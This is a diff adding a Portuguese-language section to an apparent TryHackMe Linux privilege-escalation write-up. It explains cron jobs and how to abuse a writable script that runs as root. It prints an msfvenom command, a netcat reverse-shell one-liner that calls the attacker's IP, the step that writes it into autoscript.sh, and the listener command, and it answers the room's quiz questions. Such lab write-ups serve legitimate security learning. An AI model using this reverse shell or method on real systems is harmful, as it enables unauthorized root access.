@@ -395,3 +395,76 @@ uid=0(root) gid=0(root) groups=0(root)
 # 
 ```
 
+## Exploiting Crontab
+
+### O que é o cron?
+
+O daemon Cron é um processo que fica rodando continuamente, responsável por executar tarefas agendadas. Pode-se criar um arquivo crontab contendo comandos e instruções para o daemon Cron executar. Normalmente, chama-se de job uma tarefa agendada.
+
+### Como visualizar quais Cronjobs estão ativos.
+
+Pode-se usar o comando "***cat /etc/crontab***" para ver quais cron jobs estão agendados. É importante sempre verificar manualmente, quando possível, especialmente se o LinEnum, ou um script semelhante, não encontrar nada.
+
+### Formato do cronjob
+
+Cronjobs existem em um determinado formato, ser capaz de ler esse formato é importante se você quiser explorar um cron job, dentro de um escopo de pentest.
+
+- **\#** = ID
+- **m** = Minuto
+- **h** = Hora
+- **dom** = Dia do mês
+- **mon** = Mês
+- **dow** = Dia da semana
+- **user** = Com que usuário será executado
+- **command** = Qual comando será executado
+
+Um exemplo:
+
+```shell
+#  m   h dom mon dow user  command
+
+17 *   1  *   *   *  root  cd / && run-parts --report /etc/cron.hourly
+```
+
+Pode-se usar o [Crontab Guru](https://crontab.guru/) para validar e aprender mais sobre.
+
+### Como explorar crontab
+
+Na task de varredura do LinEnum, observou-se que o arquivo autoscript.sh, na área de trabalho do user4, está programado para ser executado a cada cinco minutos. Ele é de propriedade do root, o que significa que será executado com privilégios de root, apesar do fato de podermos gravar neste arquivo. A tarefa então é criar um comando que retornará um shell e colá-lo neste arquivo. Quando o arquivo for executado novamente em cinco minutos, o shell estará sendo executado como root.
+
+### Questões: 
+
+- a. ***First, let's exit out of root from our previous task by typing "exit". Then use "su" to swap to user4, with the password "password"***: *Não há necessidade de resposta*
+
+A questão ***a*** apenas passa orientações.
+
+- b. ***Now, on our host machine- let's create a payload for our cron exploit using msfvenom.***: *Não há necessidade de resposta*
+
+- c. ***What is the flag to specify a payload in msfvenom?***: *-p*
+
+- d. ***Create a payload using: "msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R"***: *Não há necessidade de resposta*
+
+Sobre a questão ***d***, apenas é passada orientação de como gerar um payload com o msfvenon. Deve-se substituir o LOCALIP pelo ip do host atacante.
+
+- e. ***What directory is the "autoscript.sh" under?***: */home/user4/Desktop*
+
+- f. ***Lets replace the contents of the file with our payload using: "echo [MSFVENOM OUTPUT] > autoscript.sh"***: *Não há necessidade de resposta*
+
+Sobre a questão ***f***, a saída do msfvenom, foi:
+
+```shell
+┌──(root㉿kali)-[/tryhackme/rooms/commonlinuxprivesc]
+└─# msfvenom -p cmd/unix/reverse_netcat lhost=10.8.95.233 lport=8888 R
+[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
+[-] No arch selected, selecting arch: cmd from the payload
+No encoder specified, outputting raw payload
+Payload size: 89 bytes
+mkfifo /tmp/knef; nc 10.8.95.233 8888 0</tmp/knef | /bin/sh >/tmp/knef 2>&1; rm /tmp/knef
+```
+O Trecho abaixo é o que deve ser adicionado no autoscript.sh, conforme abaixo:
+
+```shell
+echo "mkfifo /tmp/knef; nc 10.8.95.233 8888 0</tmp/knef | /bin/sh >/tmp/knef 2>&1; rm /tmp/knef" > autoscript.sh
+```
+
+As duas últimas questões também não necessitam de respostas. É informado apenas para executar o netcat para ficar ouvindo na porta 8888 (nc -lvpn 8888) na máquina atacante e aguardar a execução cronjob, que executa a cada 5 minutos. Com isso será aberto um shell reverso para a máquina atacante.
